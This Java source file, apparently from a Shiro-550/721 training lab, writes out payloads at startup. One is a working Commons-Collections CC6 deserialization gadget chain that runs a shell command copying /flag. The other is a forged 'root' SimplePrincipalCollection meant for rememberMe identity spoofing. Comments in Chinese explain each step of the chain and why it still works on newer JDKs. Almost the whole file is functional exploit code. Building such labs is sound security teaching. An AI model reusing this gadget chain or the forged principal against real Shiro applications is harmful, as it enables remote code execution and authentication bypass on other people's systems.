package lab;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * 生成两份"原料"，启动时落到 /app/payloads/，通过 /payloads/ 直接下载：
 *
 *   cc6.bin            CC6 反序列化链（明文，还没加密）——给 Shiro-550 用
 *   principal_root.bin 一个合法的 SimplePrincipalCollection("root") 序列化字节
 *                      ——给 Shiro-721 伪造身份用
 *
 * 注意这两份都是**未加密**的序列化字节。拿到它们并不等于拿下靶场：
 *   550 还缺 AES key（默认密钥或爆破出来的）
 *   721 还缺"让服务端接受这段密文"的能力（padding oracle）
 * 真实攻击里这两步也是分开的：ysoserial 出字节，工具负责套 Shiro 的壳。
 */
public final class LabGen {

    /** 550 靶场要执行的命令：把 flag 搬到一个能通过 HTTP 读的目录 */
    static final String CMD = "cat /flag > /tmp/out/flag.txt";

    private LabGen() {
    }

    public static void prepare() {
        try {
            File dir = new File("/app/payloads");
            if (!dir.exists() && !dir.mkdirs()) {
                System.err.println("[lab] 无法创建 /app/payloads，payload 下载将不可用");
                return;
            }
            write(new File(dir, "cc6.bin"), cc6(CMD));

            byte[] pr = principal("root");
            write(new File(dir, "principal_root.bin"), pr);

            // 自检：把刚写出去的字节立刻读回来，确认在**这个 classpath** 下
            // 能完整还原。721 的攻击就是把这个对象塞进 rememberMe，
            // 如果这里都过不了，服务端那边更不可能过。
            Object back = deserialize(pr);
            System.out.println("[lab] principal 自检通过: " + back + " (" + pr.length + " 字节)");
        } catch (Exception e) {
            System.err.println("[lab] payload 自检失败: " + e);
            e.printStackTrace();
        }
    }

    private static Object deserialize(byte[] data) throws Exception {
        try (java.io.ObjectInputStream ois =
                     new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    private static void write(File f, byte[] data) throws Exception {
        try (FileOutputStream out = new FileOutputStream(f)) {
            out.write(data);
        }
    }

    // ------------------------------------------------------------------
    //  CC6
    // ------------------------------------------------------------------
    /**
     * 链子（反序列化后自上而下执行）：
     *
     *   HashMap.readObject()
     *     └─ hash(key) → TiedMapEntry.hashCode()
     *        └─ getValue() → LazyMap.get()
     *           └─ 缓存里没有这个 key → factory.transform()
     *              └─ ChainedTransformer
     *                 ├─ ConstantTransformer(Runtime.class)
     *                 ├─ InvokerTransformer("getMethod", "getRuntime")
     *                 ├─ InvokerTransformer("invoke")
     *                 └─ InvokerTransformer("exec", "/bin/sh -c ...")
     *
     * 为什么用 CC6 而不是 CC1：CC1 依赖 AnnotationInvocationHandler.readObject()，
     * JDK 8u71 之后那条路被堵死了；CC6 走 HashMap 的 hashCode，8u71+ 依然有效。
     */
    static byte[] cc6(String command) throws Exception {
        Transformer[] fake = new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chain = new ChainedTransformer(fake);

        Map<Object, Object> inner = new HashMap<Object, Object>();
        Map<Object, Object> lazyMap = LazyMap.decorate(inner, chain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "k");

        Map<Object, Object> outer = new HashMap<Object, Object>();
        outer.put(entry, "v");

        // put 的时候已经触发过一次 fake 链，key 被缓存进 lazyMap；
        // 不清掉的话反序列化时 get() 直接命中缓存，不会再调 transform。
        lazyMap.remove("k");

        Transformer[] real = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class},
                        new Object[]{new String[]{"/bin/sh", "-c", command}}),
        };

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, real);

        return serialize(outer);
    }

    // ------------------------------------------------------------------
    //  721 用的 PrincipalCollection
    // ------------------------------------------------------------------
    /**
     * Shiro 的 rememberMe 里存的就是这玩意儿：一个 PrincipalCollection。
     * Shiro 反序列化后拿它当"已记住的身份"，不校验签名、不校验来源。
     *
     * realm 名写 "SimpleAccountRealm" 只是为了跟服务端对得上；
     * 实际上 Shiro 还原 principal 时并不校验 realm 名，攻击者随便写。
     */
    static byte[] principal(String name) throws Exception {
        SimplePrincipalCollection pc = new SimplePrincipalCollection(name, "SimpleAccountRealm");
        return serialize(pc);
    }

    private static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(o);
        }
        return bos.toByteArray();
    }
}
